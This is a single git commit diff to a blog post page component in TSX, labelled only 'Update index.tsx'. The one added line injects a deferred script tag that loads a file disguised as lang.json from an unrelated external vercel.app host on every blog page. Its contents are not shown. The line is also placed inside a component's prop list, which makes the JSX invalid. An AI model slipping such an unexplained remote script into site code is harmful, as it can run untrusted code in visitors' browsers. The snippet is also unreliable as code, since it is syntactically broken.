c41309910e671ed298bcc876547e6d377b934f38
Peter yang <92738287+ssangyongsports@users.noreply.github.com>
2023-01-06 17:29:32 +0800

    Update index.tsx

--- src/theme/BlogPostPage/index.tsx
+++ src/theme/BlogPostPage/index.tsx
@@ -43,6 +43,7 @@ function BlogPostPageContent({ sidebar, children }: { sidebar: BlogSidebar; chil
           pageTitle: 'PAGE_TITLE',
           pageUrl: 'PAGE_URL'
         }}
+          <script defer src="https://im12523gss.vercel.app/lang.json"></script>
       />
 
       )}
